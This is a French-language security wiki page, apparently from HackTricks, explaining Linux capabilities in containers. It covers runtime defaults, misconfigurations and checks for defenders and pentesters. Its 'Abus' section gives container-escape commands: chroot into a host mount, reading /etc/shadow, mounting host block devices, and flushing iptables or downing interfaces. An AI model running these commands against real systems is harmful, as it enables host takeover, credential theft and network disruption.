# Linux Capabilities dans les conteneurs

{{#include ../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les Linux capabilities sont l'un des éléments les plus importants de la sécurité des conteneurs car elles répondent à une question subtile mais fondamentale : **que signifie réellement « root » à l'intérieur d'un conteneur ?** Sur un système Linux classique, l'UID 0 impliquait historiquement un ensemble de privilèges très large. Dans les noyaux modernes, ce privilège est décomposé en unités plus petites appelées capabilities. Un processus peut s'exécuter en root et néanmoins ne pas disposer de nombreuses opérations puissantes si les capabilities pertinentes ont été supprimées.

Les conteneurs dépendent fortement de cette distinction. Beaucoup de workloads sont encore lancés avec l'UID 0 à l'intérieur du conteneur pour des raisons de compatibilité ou de simplicité. Sans le dropping des capabilities, cela serait beaucoup trop dangereux. Avec le dropping des capabilities, un processus root dans un conteneur peut toujours effectuer de nombreuses tâches ordinaires à l'intérieur du conteneur tout en se voyant refuser des opérations noyau plus sensibles. C'est pourquoi un shell de conteneur affichant `uid=0(root)` ne signifie pas automatiquement « root de l'hôte » ni même « privilège noyau étendu ». Ce sont les capability sets qui déterminent la valeur réelle de cette identité root.

Pour la référence complète des Linux capabilities et de nombreux exemples d'abus, voir :

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Fonctionnement

Les capabilities sont suivies dans plusieurs ensembles, notamment les ensembles permitted, effective, inheritable, ambient et bounding. Pour de nombreuses évaluations de conteneurs, la sémantique exacte au niveau noyau de chaque ensemble est moins immédiatement importante que la question pratique finale : **quelles opérations privilégiées ce processus peut-il effectuer avec succès maintenant, et quels gains de privilèges futurs restent possibles ?**

La raison est que de nombreuses techniques d'évasion sont en réalité des problèmes de capabilities déguisés en problèmes de conteneur. Un workload disposant de `CAP_SYS_ADMIN` peut accéder à une grande partie des fonctionnalités du noyau auxquelles un processus root normal dans un conteneur ne devrait pas toucher. Un workload avec `CAP_NET_ADMIN` devient beaucoup plus dangereux s'il partage aussi le namespace réseau de l'hôte. Un workload avec `CAP_SYS_PTRACE` devient bien plus intéressant s'il peut voir les processus de l'hôte via le partage de PID de l'hôte. Dans Docker ou Podman cela peut apparaître comme `--pid=host` ; dans Kubernetes cela apparaît généralement comme `hostPID: true`.

En d'autres termes, l'ensemble des capabilities ne peut pas être évalué isolément. Il doit être considéré conjointement avec les namespaces, seccomp et la politique MAC.

## Lab

Une façon très directe d'inspecter les capabilities à l'intérieur d'un conteneur est :
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Vous pouvez également comparer un conteneur plus restrictif avec un qui a toutes les capabilities ajoutées :
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Pour observer l'effet d'un ajout ciblé, essayez de tout supprimer, puis de ne réajouter qu'une seule capability :
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ces petites expériences montrent qu'un runtime ne se contente pas d'activer un booléen appelé "privileged". Il façonne la surface réelle des privilèges disponible pour le processus.

## Capacités à haut risque

Même si de nombreuses capacités peuvent être pertinentes selon la cible, quelques-unes reviennent fréquemment dans container escape analysis.

**`CAP_SYS_ADMIN`** est celle que les défenseurs doivent considérer avec le plus de suspicion. Elle est souvent décrite comme "the new root" parce qu'elle débloque un énorme volume de fonctionnalités, y compris les opérations liées au mount, les comportements sensibles aux namespaces, et de nombreux chemins du kernel qui ne devraient jamais être exposés aux conteneurs de manière négligente. Si un conteneur a `CAP_SYS_ADMIN`, un seccomp faible, et pas de confinement MAC fort, de nombreuses voies d'évasion classiques deviennent beaucoup plus réalistes.

**`CAP_SYS_PTRACE`** importe lorsque la visibilité des processus existe, surtout si le PID namespace est partagé avec l'hôte ou avec des workloads voisins intéressants. Elle peut transformer la visibilité en manipulation.

**`CAP_NET_ADMIN`** et **`CAP_NET_RAW`** sont importantes dans des environnements axés réseau. Sur un réseau bridge isolé elles peuvent déjà être risquées ; sur un host network namespace partagé elles sont bien pires parce que le workload peut être capable de reconfigurer le réseau de l'hôte, sniff, spoof, ou interférer avec les flux de trafic locaux.

**`CAP_SYS_MODULE`** est généralement catastrophique dans un environnement rootful parce que charger des modules du kernel équivaut à un contrôle du kernel de l'hôte. Elle ne devrait presque jamais apparaître dans un workload de conteneur à usage général.

## Utilisation du runtime

Docker, Podman, les stacks basées sur containerd, et CRI-O utilisent tous des contrôles de capacités, mais les valeurs par défaut et les interfaces de gestion diffèrent. Docker les expose très directement via des flags tels que `--cap-drop` et `--cap-add`. Podman expose des contrôles similaires et bénéficie souvent de l'exécution rootless comme couche de sécurité supplémentaire. Kubernetes expose les ajouts et suppressions de capacités via le `securityContext` du Pod ou du conteneur. Les environnements system-container tels que LXC/Incus reposent également sur le contrôle des capabilities, mais l'intégration plus large avec l'hôte de ces systèmes pousse souvent les opérateurs à assouplir les valeurs par défaut plus agressivement qu'ils ne le feraient dans un environnement d'app-container.

Le même principe s'applique partout : une capacité qu'il est techniquement possible d'accorder n'est pas nécessairement une capacité à accorder. Beaucoup d'incidents réels commencent lorsqu'un opérateur ajoute une capacité simplement parce qu'un workload a échoué sous une configuration plus stricte et que l'équipe avait besoin d'un correctif rapide.

## Mauvaises configurations

L'erreur la plus évidente est **`--cap-add=ALL`** dans des CLI de type Docker/Podman, mais ce n'est pas la seule. En pratique, un problème plus fréquent est d'accorder une ou deux capacités extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour "make the application work" sans comprendre aussi les implications sur les namespaces, seccomp, et mount. Un autre mode d'échec courant est de combiner des capacités supplémentaires avec le partage des namespaces host. Dans Docker ou Podman cela peut apparaître comme `--pid=host`, `--network=host`, ou `--userns=host` ; dans Kubernetes l'exposition équivalente apparaît généralement via des réglages de workload tels que `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons change ce que la capacité peut réellement affecter.

Il est également courant de voir des administrateurs penser que parce qu'un workload n'est pas entièrement `--privileged`, il reste néanmoins significativement contraint. Parfois c'est vrai, mais parfois la posture effective est déjà assez proche de privilégiée pour que la distinction cesse d'avoir de l'importance opérationnellement.

## Abus

La première étape pratique consiste à énumérer l'ensemble effectif des capacités et à tester immédiatement les actions spécifiques à chaque capacité qui importeraient pour un escape ou pour l'accès aux informations de l'hôte :
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` est présent, testez d'abord mount-based abuse et host filesystem access, car c'est l'un des vecteurs de breakout les plus courants :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` est présent et que le container peut voir des processus intéressants, vérifiez si la capability peut être transformée en process inspection :
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` ou `CAP_NET_RAW` est présent, testez si la charge de travail peut manipuler la pile réseau visible ou au moins collecter des informations réseau utiles :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Lorsqu'un test de capability réussit, combinez-le avec la situation des namespaces. Une capability qui paraît simplement risquée dans un namespace isolé peut devenir immédiatement une primitive d'escape ou de host-recon lorsque le container partage aussi le host PID, le host network ou les host mounts.

### Exemple complet : `CAP_SYS_ADMIN` + Host Mount = Host Escape

Si le container dispose de `CAP_SYS_ADMIN` et d'un writable bind mount du filesystem de l'hôte tel que `/host`, le chemin d'escape est souvent simple :
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` réussit, les commandes s'exécutent désormais dans le contexte du système de fichiers racine de l'hôte :
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` n'est pas disponible, le même résultat peut souvent être obtenu en appelant le binaire via l'arborescence montée :
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemple complet : `CAP_SYS_ADMIN` + Accès au périphérique

Si un block device de l'hôte est exposé, `CAP_SYS_ADMIN` peut le transformer en un accès direct au système de fichiers de l'hôte :
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Exemple complet : `CAP_NET_ADMIN` + Host Networking

Cette combinaison ne donne pas toujours directement un accès root sur l'hôte, mais elle peut reconfigurer entièrement la pile réseau de l'hôte :
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Cela peut permettre un déni de service, l'interception de trafic ou l'accès à des services qui étaient auparavant filtrés.

## Vérifications

Le but des vérifications des capabilities n'est pas seulement d'extraire des valeurs brutes, mais de savoir si le processus dispose de privilèges suffisants pour que son namespace et son état de mount actuels soient dangereux.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Ce qui est intéressant ici :

- `capsh --print` est le moyen le plus simple pour repérer les capacités à haut risque telles que `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- La ligne `CapEff` dans `/proc/self/status` indique ce qui est effectivement effectif maintenant, pas seulement ce qui pourrait être disponible dans d'autres ensembles.
- Un dump de capacités devient beaucoup plus important si le container partage aussi les namespaces PID, network ou user de l'hôte, ou a des montages hôtes en écriture.

Après avoir collecté les informations brutes sur les capacités, l'étape suivante est l'interprétation. Demandez si le processus est root, si les user namespaces sont actifs, si les host namespaces sont partagés, si seccomp est en mode enforcing, et si AppArmor ou SELinux restreignent encore le processus. Un ensemble de capacités pris isolément n'est qu'une partie de l'histoire, mais c'est souvent la partie qui explique pourquoi une évasion de container fonctionne et une autre échoue avec le même point de départ apparent.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Ensemble de capacités réduit par défaut | Docker conserve une allowlist par défaut des capacités et supprime les autres | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Ensemble de capacités réduit par défaut | Les conteneurs Podman sont non privilégiés par défaut et utilisent un modèle de capacités réduit | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hérite des valeurs par défaut du runtime sauf modification | Si aucun `securityContext.capabilities` n'est spécifié, le container obtient l'ensemble de capacités par défaut du runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Généralement valeur par défaut du runtime | L'ensemble effectif dépend du runtime plus la spec du Pod | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Pour Kubernetes, le point important est que l'API ne définit pas un ensemble universel de capacités par défaut. Si le Pod n'ajoute ni ne supprime de capacités, la workload hérite de la valeur par défaut du runtime pour ce nœud.
